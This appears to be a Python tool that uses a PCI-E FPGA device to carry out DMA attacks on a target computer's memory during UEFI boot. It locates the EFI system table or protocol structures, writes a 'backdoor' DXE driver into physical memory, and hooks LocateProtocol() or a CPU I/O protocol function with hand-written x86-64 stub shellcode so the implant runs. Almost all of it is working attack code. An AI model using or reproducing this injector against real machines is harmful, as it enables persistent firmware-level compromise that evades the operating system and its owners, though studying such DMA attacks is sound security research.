#!/usr/bin/env python

import sys, os, time, uuid, json
from struct import pack, unpack
from optparse import OptionParser

from pcie_lib import *

# see https://github.com/binarly-io/efiXplorer/blob/master/guids/guids.json
GUIDS_FILE_PATH = 'guids.json'

RETRY_WAIT = 1

# physocal address of stub used to pass execution to the DXE driver
STUB_ADDR = 0x10000

# physical address where DXE driver will be loaded
BACKDOOR_ADDR = 0xc0000

# physical address where exploitation status info will be stored
STATUS_ADDR = 0x1000 - (8 * 2)

# force to re-infect the system even when payload was already planted
ALLOW_REINFECT = True

# see struct _INFECTOR_CONFIG in PeiBackdoor.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QQQ'
INFECTOR_CONFIG_LEN = 8 + 8 + 8

HEADER_SIZE = 0x400
HEADER_MAGIC = 'MZ'

# for find_prot_entry()
PROT_SCAN_TO = 0xa0000000
PROT_SCAN_FROM = 0x95000000
PROT_SCAN_STEP = PAGE_SIZE

# for find_system_table()
ST_SCAN_FROM = 0xf0000000
ST_SCAN_STEP = 0x10 * PAGE_SIZE

TSEG_MAX_SIZE = 0x800000

EFI_CPU_IO2_PROTOCOL_GUID = 'ad61f191-ae5f-4c0e-b9fa-e869d288c64f'
EFI_LOADED_IMAGE_PROTOCOL_GUID = '5b1b31a1-9562-11d2-8e3f-00a0c969723b'

# protocol and function to hook
PROT_HOOK_GUID = EFI_CPU_IO2_PROTOCOL_GUID
PROT_HOOK_FUNC = 2

# see edk2/MdeModulePkg/Core/Dxe/Hand/Handle.h 
PROTOCOL_ENTRY_SIGNATURE = 'prte'
PROTOCOL_INTERFACE_SIGNATURE = 'pifc'

EFI_SYSTEM_TABLE_BootServices = 0x60
EFI_BOOT_SERVICES_LocateProtocol = 0x140

DXE_INJECT_ST   = 0
DXE_INJECT_PROT = 1

valid_dxe_addr = lambda addr: addr > 0x1000 and addr < 0xffffffff

def _infector_config_offset(pe):
        
    for section in pe.sections:

        # find .conf section of payload image
        if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

            return section.PointerToRawData

    raise(Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION))

def _infector_config_get(pe, data):

    offs = _infector_config_offset(pe)
    
    return unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])

def _infector_config_set(pe, data, *args):

    offs = _infector_config_offset(pe)

    return data[: offs] + \
           pack(INFECTOR_CONFIG_FMT, *args) + \
           data[offs + INFECTOR_CONFIG_LEN :]

def infector_get_image(payload_data, locate_protocol, system_table):

    import pefile

    # load payload image
    pe = pefile.PE(data = payload_data)

    if pe.OPTIONAL_HEADER.FileAlignment != pe.OPTIONAL_HEADER.SectionAlignment:

        raise(Exception('Bad payload image'))

    # read _INFECTOR_CONFIG, this structure is located inside .conf section of payload image
    entry_rva, _, _ = _infector_config_get(pe, payload_data)
    config_rva = _infector_config_offset(pe)

    # calculate payload image entry point RVA
    entry_rva -= pe.OPTIONAL_HEADER.ImageBase
    
    # write updated _INFECTOR_CONFIG back to the payload image
    data = _infector_config_set(pe, payload_data, entry_rva, locate_protocol, system_table)

    return data, entry_rva, config_rva

def find_sys_table_from_image(dev, addr):

    import pefile

    def _find(data):

        for ptr in range(0, len(data) / 8):
            
            # get single pointer from data section
            val = unpack('Q', data[ptr * 8 : ptr * 8 + 8])[0]
            
            # check for valid physical address
            if val > 0x10000000 and val < 0x100000000:

                # check EFI_SYSTEM_TABLE signature
                if dev.mem_read(val, 8) == 'IBI SYST':

                    return val

        return None

    # read PE image header
    pe = pefile.PE(data = dev.mem_read(addr, HEADER_SIZE))

    # check for EFI_SYSTEM_TABLE at the beginning of the .data section
    for section in pe.sections:

        if section.Name.find('.data') == 0:

            val = _find(dev.mem_read(addr + section.VirtualAddress, PAGE_SIZE))

            if val is not None: return val

    # check for EFI_SYSTEM_TABLE at the end of the .text section
    for section in pe.sections:

        if section.Name.find('.text') == 0:

            val = _find(dev.mem_read(addr + section.VirtualAddress + \
                                            section.SizeOfRawData - PAGE_SIZE, PAGE_SIZE))
        
            if val is not None: return val

    return None

def find_sys_table(dev):

    base, ptr = ST_SCAN_FROM, 0

    print('[+] Looking for DXE driver PE image...')

    # try to find usable UEFI image at the middle of the first 4GB
    while ptr < base:        

        image = base - ptr
        
        try:

            # check for DOS header
            if dev.mem_read(image, 2) == HEADER_MAGIC:

                print('[+] PE image is at 0x%x' % image)

                addr = find_sys_table_from_image(dev, image)
                if addr is not None:

                    return addr

            ptr += ST_SCAN_STEP

        except dev.ErrorBadCompletion:            

            ptr += TSEG_MAX_SIZE

    raise(Exception('Unable to find EFI_SYSTEM_TABLE'))

def find_prot_entry_from_image(dev, addr, pe, known_locations):
    
    sc_addr = None

    for section in pe.sections:

        # find data section
        if section.Name.find('.data') == 0:

            sc_addr = section.VirtualAddress
            break

    if sc_addr is not None:

        # read section contents
        data = dev.mem_read(addr + sc_addr, PAGE_SIZE * 2)

        for ptr in range(0, len(data) / 8):
            
            # get single pointer from data section
            val = unpack('Q', data[ptr * 8 : ptr * 8 + 8])[0]
            
            # check for valid physical address
            if valid_dxe_addr(val) and val < addr and val & 0xfff != 0:

                is_known = False

                for known_val in known_locations:

                    if val >= known_val and val < known_val + PAGE_SIZE:

                        # this region was already scanned
                        is_known = True
                        break

                if not is_known:

                    known_locations.append(val)

                    try:

                        # check for the PROTOCOL_ENTRY structure
                        buff = dev.mem_read(val, PAGE_SIZE)
                        offs = buff.find(PROTOCOL_ENTRY_SIGNATURE)

                        if offs != -1:

                            # return PROTOCOL_ENTRY address
                            return val + offs

                    except dev.ErrorBadCompletion:            

                        print('[!] Error while probing data at 0x%.8x' % val)

    return None

def find_prot_entry(dev):

    image, known_locations = PROT_SCAN_FROM, []

    print('[+] Looking for DXE driver PE image...')

    # try to find usable UEFI image at the middle of the first 4GB
    while image < PROT_SCAN_TO:
        
        try:

            # check for DOS header
            if dev.mem_read(image, 2) == HEADER_MAGIC:

                print('[+] PE image is at 0x%x' % image)

                import pefile

                # read PE image header
                pe = pefile.PE(data = dev.mem_read(image, HEADER_SIZE))
                
                # scan image contents
                addr = find_prot_entry_from_image(dev, image, pe, known_locations)
                if addr is not None:

                    return addr

                image += align_up(pe.OPTIONAL_HEADER.SizeOfImage, PAGE_SIZE)
                continue

        except dev.ErrorBadCompletion:            

            print('[!] Error while probing image at 0x%.8x' % image)        

        image += PROT_SCAN_STEP

    raise(Exception('Unable to find PROTOCOL_ENTRY'))

def prot_get(dev, entry_addr, guid, param):

    if guid == param:

        # get available interfaces
        intf_list = prot_enum_intf(dev, entry_addr)
        if len(intf_list) > 0:

            # we are interested only in interface address
            return map(lambda intf: intf[1], intf_list)

def prot_print_load_guids():

    ret = {}

    if os.path.isfile(GUIDS_FILE_PATH):

        with open(GUIDS_FILE_PATH) as fd:

            # enumerate known UEFI GUIDs
            for name, guid in json.load(fd).items():

                # convert GUID from guids.json into the sane form
                guid = tuple(guid[: 5]) + unpack('!Q', '\0\0' + pack('BBBBBB', *tuple(guid[5 :])))

                ret[uuid.UUID(fields = guid)] = name

    return ret

def prot_print(dev, entry_addr, guid, param):    

    if param is not None and param.has_key(guid):

        # get protocol name by GUID
        guid = param[guid]

    print(' * 0x%.8x: guid = %s' % (entry_addr, guid))

    # get available interfaces
    for intf, addr in prot_enum_intf(dev, entry_addr):

        print('   0x%.8x: addr = 0x%.8x' % (intf, addr))

    print('')

def prot_enum_intf(dev, entry_addr):

    ret = []

    # read interface list entry head
    intf_list = entry_addr + 8 * 3 + 16
    intf_next, intf_prev = unpack('QQ', dev.mem_read(intf_list, 8 * 2))

    assert valid_dxe_addr(intf_next)
    assert valid_dxe_addr(intf_prev)

    if intf_next != intf_list:

        intf_next -= 8 * 4
        intf = intf_next

        while True:       

            assert valid_dxe_addr(intf) 

            # read PROTOCOL_INTERFACE structure
            sign, _, _, _, next, prev, prot, addr = unpack('8sQQQQQQQ', dev.mem_read(intf, 8 * 8))

            assert valid_dxe_addr(next)
            assert valid_dxe_addr(prev)
            assert valid_dxe_addr(prot)

            assert addr == 0 or valid_dxe_addr(addr)

            # check for the valid entry
            if sign.split('\0')[0] == PROTOCOL_INTERFACE_SIGNATURE:

                assert prot == entry_addr

                ret.append(( intf, addr ))

            # go to the next entry
            intf = next - 8 * 4

            if intf == intf_next:

                # end of enumeration
                break

    return ret

def prot_enum(dev, entry_addr, handler = None, param = None):

    entry = entry_addr

    while True:        

        assert valid_dxe_addr(entry)

        # read PROTOCOL_ENTRY structure
        sign, next, prev, guid = unpack('8sQQ16s', dev.mem_read(entry, 8 * 3 + 16))

        assert valid_dxe_addr(next)
        assert valid_dxe_addr(prev)

        # check for the valid entry
        if sign.split('\0')[0] == PROTOCOL_ENTRY_SIGNATURE:

            guid = uuid.UUID(bytes_le = guid)

            if handler is not None:

                ret = handler(dev, entry, guid, param)
                if ret is not None:

                    return ret

        # go to the next entry
        entry = next - 8

        if entry == entry_addr:

            # end of enumeration
            break

def wait_for_endpoint():

    dev = None

    print('[+] Waiting for PCI-E link...')

    while True:

        try:

            # open FPGA endpoint
            dev = TransactionLayer()

            # try to read some memory 
            if dev.mem_read(BACKDOOR_ADDR, 2) == HEADER_MAGIC:

                if not ALLOW_REINFECT:

                    print('ERROR: Already infected')
                    return -1

            break

        except (Endpoint.ErrorNotReady, Endpoint.ErrorTimeout, TransactionLayer.ErrorBadCompletion) as e: 

            # link is not ready yet
            print('[!] ' + str(e))        

        if dev is not None:

            dev.close()    
            dev = None

        # system is not ready yet
        time.sleep(RETRY_WAIT)    
    
    print('[+] PCI-E link with target is up')

    return dev

def dxe_inject_prot(payload = None, payload_data = None, system_table = None, prot_entry = None, status_addr = STATUS_ADDR):    

    if payload is not None:

        print('[+] Reading DXE phase payload from %s' % payload)

        assert os.path.isfile(payload)

        with open(payload, 'rb') as fd:

            # read payload image
            payload_data = fd.read()

    # initialize PCI-E endpoint
    dev = wait_for_endpoint() 

    start_time = time.time()

    if prot_entry is None:

        # find PROTOCOL_ENTRY structure address
        prot_entry = find_prot_entry(dev)

        print('[+] PROTOCOL_ENTRY address is 0x%x' % prot_entry)

        # find all of the protocol interfaces
        intf_list = prot_enum(dev, prot_entry, handler = prot_get, param = uuid.UUID(PROT_HOOK_GUID))
        if intf_list is None or len(intf_list) == 0:

            raise(Exception('Unable to find protocol interfaces'))

        intf_addr = intf_list[0]

    else:

        intf_addr = prot_entry

    print('[+] Protocol interface %s address is 0x%x' % (PROT_HOOK_GUID, intf_addr))

    if payload_data is not None:

        data, entry_rva, _ = infector_get_image(payload_data, 0, 0 if system_table is None else system_table)
        entry_addr = BACKDOOR_ADDR + entry_rva

        print('Backdoor image size is 0x%x' % len(data))
        print('Backdoor entry RVA is 0x%x' % entry_rva)
        print('Planting DXE stage driver at 0x%x...' % BACKDOOR_ADDR)        

        # write image into the memory
        dev.mem_write(BACKDOOR_ADDR, data)

        dev.mem_write_8(status_addr + 0, 0)
        dev.mem_write_8(status_addr + 8, 0)

        # read original function address
        patch_ptr = intf_addr + PROT_HOOK_FUNC * 8
        patch_val = dev.mem_read_8(patch_ptr)

        print('[+] Patch location is 0x%x' % patch_ptr)
        print('[+] Function address is 0x%x' % patch_val)

        assert valid_dxe_addr(patch_val)

        # make stub code to call the payload
        stub = [ '\x51',                                # push   rcx
                 '\x48\xb8' + pack('Q', patch_val),     # mov    rax, patch_val
                 '\x48\xb9' + pack('Q', patch_ptr),     # mov    rcx, patch_ptr
                 '\x48\x89\x01',                        # mov    qword ptr [rcx], rax
                 '\x52',                                # push   rdx
                 '\x41\x50',                            # push   r8
                 '\x41\x51',                            # push   r9
                 '\x41\x52',                            # push   r10
                 '\x41\x53',                            # push   r11   
                 '\x48\x83\xec\x28',                    # sub    rsp, 0x28
                 '\x48\xb8' + pack('Q', entry_addr),    # mov    rax, entry_addr
                 '\xff\xd0',                            # call   rax 
                 '\x48\x83\xc4\x28',                    # add    rsp, 0x28                 
                 '\x41\x5b',                            # pop    r11
                 '\x41\x5a',                            # pop    r10
                 '\x41\x59',                            # pop    r9
                 '\x41\x58',                            # pop    r8
                 '\x5a',                                # pop    rdx
                 '\x59',                                # pop    rcx
                 '\x48\xb8' + pack('Q', patch_val),     # mov    rax, patch_val
                 '\xff\xe0' ]                           # jmp    rax 

        # write stub into the memory
        dev.mem_write(STUB_ADDR, ''.join(stub))

        # set up hook
        dev.mem_write_8(patch_ptr, STUB_ADDR)

        print('%f sec.' % (time.time() - start_time))

    return dev

def dxe_inject_st(payload = None, payload_data = None, system_table = None, prot_entry = None, status_addr = STATUS_ADDR):

    if payload is not None:

        print('[+] Reading DXE phase payload from %s' % payload)

        assert os.path.isfile(payload)

        with open(payload, 'rb') as fd:

            # read payload image
            payload_data = fd.read()

    # initialize PCI-E endpoint
    dev = wait_for_endpoint() 

    t = time.time()

    if system_table is None:

        # get EFI_SYSTEM_TABLE address
        system_table = find_sys_table(dev)

        print('[+] EFI_SYSTEM_TABLE is at 0x%x' % system_table)

    assert valid_dxe_addr(system_table)

    # get EFI_BOOT_SERVICES address
    boot_services = dev.mem_read_8(system_table + EFI_SYSTEM_TABLE_BootServices)    

    print('[+] EFI_BOOT_SERVICES is at 0x%x' % boot_services)

    assert valid_dxe_addr(boot_services)

    # get LocateProtocol() address
    locate_protocol = dev.mem_read_8(boot_services + EFI_BOOT_SERVICES_LocateProtocol)    

    print('[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x%x' % locate_protocol)    

    assert valid_dxe_addr(locate_protocol)

    if payload_data is not None:

        data, entry_rva, _ = infector_get_image(payload_data, locate_protocol, system_table)
        new_locate_protocol = BACKDOOR_ADDR + entry_rva

        print('Backdoor image size is 0x%x' % len(data))
        print('Backdoor entry RVA is 0x%x' % entry_rva)
        print('Planting DXE stage driver at 0x%x...' % BACKDOOR_ADDR)        

        # write image to the memory
        dev.mem_write(BACKDOOR_ADDR, data)

        dev.mem_write_8(status_addr + 0, 0)
        dev.mem_write_8(status_addr + 8, 0)

        print('Hooking LocateProtocol(): 0x%.8x -> 0x%.8x' % \
              (locate_protocol, new_locate_protocol))

        # hook LocateProtocol()
        dev.mem_write_8(boot_services + EFI_BOOT_SERVICES_LocateProtocol, new_locate_protocol)        

        print('%f sec.' % (time.time() - t))

    return dev

def dxe_inject(method, *args, **kvargs):

    assert method in [ DXE_INJECT_PROT, DXE_INJECT_ST ]

    if method == DXE_INJECT_PROT:

        print('[+] Using DXE protocol hook injection method')

        return dxe_inject_prot(*args, **kvargs)

    elif method == DXE_INJECT_ST:

        print('[+] Using UEFI system table hook injection method')

        return dxe_inject_st(*args, **kvargs)

def main():

    global PROT_SCAN_FROM, PROT_SCAN_TO

    parser = OptionParser()

    parser.add_option('--from', dest = 'scan_from', default = None,
        help = 'override PROT_SCAN_FROM')

    parser.add_option('--to', dest = 'scan_to', default = None,
        help = 'override PROT_SCAN_TO')

    # parse command line
    options, _ = parser.parse_args()

    if options.scan_from is not None:

        PROT_SCAN_FROM = int(options.scan_from, 16)

    if options.scan_to is not None:

        PROT_SCAN_TO = int(options.scan_to, 16)

    assert PROT_SCAN_TO > PROT_SCAN_FROM

    print('[+] Scanning memory range 0x%.8x:0x%.8x' % (PROT_SCAN_FROM, PROT_SCAN_TO))

    guids = prot_print_load_guids()

    # initialize PCI-E endpoint
    dev = wait_for_endpoint() 

    # find PROTOCOL_ENTRY structure address
    prot_entry = find_prot_entry(dev)

    print('[+] PROTOCOL_ENTRY address is 0x%x' % prot_entry)
    print('[+] Registered UEFI protocols and interfaces:\n')

    # find all of the protocol interfaces
    intf_list = prot_enum(dev, prot_entry, handler = prot_print, param = guids)

    # locate EFI_LOADED_IMAGE_PROTOCOL interfaces
    intf_list = prot_enum(dev, prot_entry, handler = prot_get, \
                                          param = uuid.UUID(EFI_LOADED_IMAGE_PROTOCOL_GUID))

    if intf_list is not None and len(intf_list) > 0:

        print('[+] Loaded UEFI images:\n')

        for loaded_image in intf_list:

            image_path_string = ''

            # read image base and size
            image_path = dev.mem_read_8(loaded_image + 4 * 8)
            image_addr = dev.mem_read_8(loaded_image + 8 * 8)
            image_size = dev.mem_read_8(loaded_image + 9 * 8)            
            
            assert valid_dxe_addr(image_addr)

            if image_path != 0:

                assert valid_dxe_addr(image_path)

                # read EFI_DEVICE_PATH_PROTOCOL
                path_data = dev.mem_read(image_path, 0x14)
                path_type, path_subtype, path_size = unpack('BBH', path_data[: 4])

                # check for MEDIA_DEVICE_PATH and MEDIA_PIWG_FW_FILE_DP
                if path_type == 0x04 and path_subtype == 0x06:

                    image_path_string = uuid.UUID(bytes_le = path_data[4 :])

                    if guids is not None and guids.has_key(image_path_string):

                        # get image name by GUID
                        image_path_string = guids[image_path_string]

            print(' * 0x%.8x: addr = 0x%.8x, size = 0x%.8x %s' % 
                      (loaded_image, image_addr, image_size, image_path_string))

        print('')    

    return 0

if __name__ == '__main__':

    exit(main())

#
# EoF
#
